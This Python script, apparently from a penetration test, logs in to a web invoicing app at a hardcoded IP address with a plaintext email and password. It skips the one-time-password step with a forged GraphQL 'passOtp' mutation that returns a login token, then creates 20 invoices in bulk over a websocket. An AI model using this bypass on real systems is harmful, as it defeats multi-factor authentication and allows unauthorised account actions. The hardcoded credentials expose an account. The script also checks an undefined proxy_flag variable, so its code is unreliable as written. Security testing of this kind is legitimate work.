import asyncio
import json
import re

import requests
import websockets
from bs4 import BeautifulSoup


url = "http://138.197.38.125:4001/"

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.127 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "connection": "keep-alive",
    "Upgrade-Insecure-Requests": "1",
}

proxies = {
    'http': 'http://127.0.0.1:8080',
}

burp_proxy_flag = False

# Create a Session object
session = requests.Session()


def remove_spaces_from_json(obj):
    if isinstance(obj, dict):
        # Recursively remove spaces from dictionary
        return {key: remove_spaces_from_json(value) for key, value in obj.items()}
    elif isinstance(obj, list):
        # Recursively remove spaces from list elements
        return [remove_spaces_from_json(element) for element in obj]
    elif isinstance(obj, str):
        # Remove spaces from string values
        return obj.replace(" ", "")
    else:
        return obj


def login(email, password):
    global url, headers, proxies, session, burp_proxy_flag

    # Create a Session object
    session = requests.Session()
    print(f"[+] user login flow")
    print("")

    # send GET request at /users/log_in
    if proxy_flag:
        res = session.get(url=url + "users/log_in", headers=headers, proxies=proxies)
    else:
        res = session.get(url=url + "users/log_in", headers=headers)
    # print(f"1. [GET /users/log_in]: {res.status_code}")

    cookies = session.cookies.get_dict()
    # print(f"_frat_test_web_user_tracker: {cookies['_frat_test_web_user_tracker']}")
    # print(f"_frat_test_v2_key: {cookies['_frat_test_v2_key']}")

    # get csrf token
    search_string = 'csrf-token" content='
    res_text = res.text
    start_index = res_text.find(search_string)
    _csrf_token = res_text[start_index + 21:start_index + 77]
    # print(f"_csrf token: {_csrf_token}")
    # print()

    # send the POST request at users/log_in and redirects to /login_challenge
    data = {
        "_csrf_token": _csrf_token,
        "user[email]": email,
        "user[password]": password,
        "user[remember_me]": "false"

    }
    # setting headers
    headers["Origin"] = url[:len(url) - 1]
    headers["Referer"] = url + "users/log_in"
    headers["Cache-Control"] = "max-age=0"
    headers["Accept-Language"] = "en-US"

    if proxy_flag:
        res = session.post(url=url + "users/log_in", data=data, headers=headers, proxies=proxies, allow_redirects=True)
    else:
        res = session.post(url=url + "users/log_in", data=data, headers=headers, allow_redirects=True)



    # send the graphql request in JSON format
    headers["Referer"] = url + "login_challenge"
    del headers['Origin']
    data = {
        "variables": "",
        "query": 'mutation {\n  passOtp(result: \"passed\") {\n    result\n    msg\n    token\n    __typename\n  }\n}'

    }

    # previous response received a csrf token but
    # in graphql request no CSRF token is going
    if proxy_flag:
        res = session.post(url=url + "api/graphql", json=data, headers=headers, proxies=proxies, allow_redirects=True)
    else:
        res = session.post(url=url + "api/graphql", json=data, headers=headers, allow_redirects=True)
    # print(f"4. [POST api/graphql] {res.status_code}")

    res_body = res.json()
    jwt_token = res_body['data']['passOtp']['token']
    # print(f"jwt token: {res_body['data']['passOtp']['token']}")
    # print()

    # send request to auth_otp/jwt endpoint and redirects to /invoices
    res = session.get(url=url + 'auth_otp/' + jwt_token, headers=headers, proxies=proxies, allow_redirects=True)
    # print(f"5. [GET /auth_otp] {res.status_code}")

    res_body = res.text
    # Parse the HTML content
    soup = BeautifulSoup(res_body, 'html.parser')

    # Find the div with the data-phx-session attribute
    div_element = soup.find('div', {'data-phx-session': True})
    data_phx_session = div_element['data-phx-session']
    data_phx_static = div_element['data-phx-static']

    # Find the <a> tag with the data-csrf attribute
    a_element = soup.find('a', {'data-csrf': True})
    data_csrf_token = a_element['data-csrf']
    # print(f"data-csrf_token: {data_csrf_token}")

    # Regular expression pattern to match 'phx-F-' pattern
    pattern = re.compile(r'phx-F-[\w-]+')

    # Search for the pattern in the HTML attributes
    matches = []
    data_ws_id = None
    for tag in soup.find_all(True):  # Find all tags
        for attr, value in tag.attrs.items():
            if isinstance(value, str) and pattern.search(value):
                matches.append(pattern.search(value).group())

    for match in matches:
        data_ws_id = match

    phx_session = data_phx_session
    phx_static = data_phx_static
    print(f"phx_session: {phx_session}")
    print(f"phx_static: {phx_static}")


    topic_name = data_ws_id
    csrf_token = data_csrf_token
    print(f"topic_name: {topic_name}")
    print(f"csrf_token: {csrf_token}")

    _frat_test_web_user_tracker_last = session.cookies['_frat_test_web_user_tracker']
    _frat_test_v2_key_last = session.cookies['_frat_test_v2_key']
    print(f"_frat_test_web_user_tracker: {_frat_test_web_user_tracker_last}")
    print(f"_frat_test_v2_key: {_frat_test_v2_key_last}")
    print("")



def get_invoices():
    print(f"[+] get invoices flow")
    print("")
    # send direct request to /invoices
    if burp_proxy_flag:
        res = session.get(url=url + 'invoices', headers=headers, proxies=proxies, allow_redirects=True)
    else:
        res = session.get(url=url + 'invoices', headers=headers, allow_redirects=True)

    res_body = res.text
    # Parse the HTML content
    soup = BeautifulSoup(res_body, 'html.parser')

    # Find the div with the data-phx-session attribute
    div_element = soup.find('div', {'data-phx-session': True})
    data_phx_session = div_element['data-phx-session']
    data_phx_static = div_element['data-phx-static']

    # Find the <a> tag with the data-csrf attribute
    a_element = soup.find('a', {'data-csrf': True})
    data_csrf_token = a_element['data-csrf']
    # print(f"data-csrf_token: {data_csrf_token}")

    # Regular expression pattern to match 'phx-F-' pattern
    pattern = re.compile(r'phx-F-[\w-]+')

    # Search for the pattern in the HTML attributes
    matches = []
    data_ws_id = None
    for tag in soup.find_all(True):  # Find all tags
        for attr, value in tag.attrs.items():
            if isinstance(value, str) and pattern.search(value):
                matches.append(pattern.search(value).group())

    for match in matches:
        data_ws_id = match

    _phx_session = data_phx_session
    _phx_static = data_phx_static
    print(f"phx_session: {_phx_session}")
    print(f"phx_static: {_phx_static}")


    _topic_name = data_ws_id
    _csrf_token = data_csrf_token

    print(f"topic_name: {_topic_name}")
    print(f"csrf_token: {_csrf_token}")

    # print values
    print(f"_frat_test_web_user_tracker: {session.cookies['_frat_test_web_user_tracker']}")
    print(f"_frat_test_v2_key: {session.cookies['_frat_test_v2_key']}")
    print("")


    return _topic_name, _csrf_token, _phx_session, _phx_static



async def websocket_requests(topic_number, initial_sequence_number, topic_name, csrf_token, phx_session, phx_static, amount, count, email):
    # proxy_url = "http://127.0.0.1:8080"
    cid = 1
    des = f"{count}--{email}"
    print(f"[+] websocket flow")

    seq = str(initial_sequence_number)
    ws_url = "ws://138.197.38.125:4001/live/websocket?_csrf_token=" + csrf_token + "&_track_static%5B0%5D=http%3A%2F%2F138.197.38.125%3A4001%2Fassets%2Fapp-e65671e73cb5445c64f7a50b1c7e8e54.css%3Fvsn%3Dd&_track_static%5B1%5D=http%3A%2F%2F138.197.38.125%3A4001%2Fassets%2Fapp-38fbc3a897090cfe84ac0e3e57230583.js%3Fvsn%3Dd&_mounts=0&_live_referer=undefined&vsn=2.0.0"

    ws_headers = {
        "Cookie": f"_frat_test_web_user_tracker={session.cookies['_frat_test_web_user_tracker']};_frat_test_v2_key={session.cookies['_frat_test_v2_key']}",
        # "Upgrade": "websocket",
        "Origin": "http://138.197.38.125:4001",
    }

    full_topic_name = "lv:" + topic_name

    async with websockets.connect(ws_url, extra_headers=ws_headers) as websocket:
        phx_join_data = [
            topic_number,
            seq,
            full_topic_name, "phx_join", {
                "url": "http://138.197.38.125:4001/invoices", "params": {"_csrf_token": csrf_token,
                                                                         "_track_static": [
                                                                             "http://138.197.38.125:4001/assets/app-e65671e73cb5445c64f7a50b1c7e8e54.css?vsn=d",
                                                                             "http://138.197.38.125:4001/assets/app-38fbc3a897090cfe84ac0e3e57230583.js?vsn=d",
                                                                         ],
                                                                         "_mounts": 0,
                                                                         },
                "session": phx_session,
                "static": phx_static,
            }
        ]
        # Remove spaces from JSON data
        cleaned_data = remove_spaces_from_json(phx_join_data)
        # Convert cleaned JSON data back to string
        json_data = json.dumps(cleaned_data, separators=(',', ':'))
        # Send the data
        # data = json.dumps(temp_data)
        print(f"\n {json_data}")
        await websocket.send(json_data)
        message = await websocket.recv()
        print(f"Received message: {message}")

        # phx_patch_data
        seq = str(int(initial_sequence_number) + 50)
        phx_patch_data = [
            topic_number,
            seq,
            full_topic_name,
            "live_patch",
            {
                "url": "http://138.197.38.125:4001/invoices/new"
            }
        ]

        cleaned_data = remove_spaces_from_json(phx_patch_data)
        # Convert cleaned JSON data back to string
        json_data = json.dumps(cleaned_data, separators=(',', ':'))
        print(f"\n {json_data}")
        await websocket.send(json_data)
        message = await websocket.recv()
        print(f"Received message: {message}")

        seq = str(int(initial_sequence_number) + 60)
        # validate
        validate_event = [
            topic_number,
            seq,
            full_topic_name,
            "event",
            {
                "type": "form",
                "event": "validate",
                "value": "invoice%5Bamount%5D=5&invoice%5Bdescription%5D=test&invoice%5Bstatus%5D=sent&invoice%5Bpayor_email%5D=test%40test.com&_target=invoice%5Bpayor_email%5D",
                "uploads": {},
                "cid": cid
            }]

        cleaned_data = remove_spaces_from_json(validate_event)
        # Convert cleaned JSON data back to string
        json_data = json.dumps(cleaned_data, separators=(',', ':'))
        print(f"\n {json_data}")
        await websocket.send(json_data)
        message = await websocket.recv()
        print(f"Received message: {message}")

        # event_data for creating the request
        seq = str(int(initial_sequence_number) + 75)
        send_event_save_data = [
            topic_number,
            seq,
            full_topic_name,
            "event",
            {
                "type": "form",
                "event": "save",
                "value": f"invoice%5Bamount%5D={amount}&invoice%5Bdescription%5D={des}&invoice%5Bstatus%5D=sent&invoice%5Bpayor_email%5D=test%40test.com",
                "cid": cid
            }

        ]

        cleaned_data = remove_spaces_from_json(send_event_save_data)

        # Convert cleaned JSON data back to string
        json_data = json.dumps(cleaned_data, separators=(',', ':'))
        print(f"\n {json_data}")
        await websocket.send(json_data)
        message = await websocket.recv()
        print(f"Received message: {message}")

        await websocket.close()
        print("")



def create_invoices(total_invoice, dollar_amount, email):
    initial_value = 5

    for n in range(1, total_invoice + 1):
        topic_name_, csrf_token_, phx_session_, phx_static_ = get_invoices()
        asyncio.run(websocket_requests(initial_value, initial_value, topic_name_, csrf_token_, phx_session_, phx_static_, str(dollar_amount), n, email))
        initial_value += 1




if __name__ == '__main__':
    email = "asinha06@team97778.testinator.com"
    password = "Wipro@123456"
    amount = 1

    invoice_count = 20
    login(email, password)
    create_invoices(invoice_count, amount, email)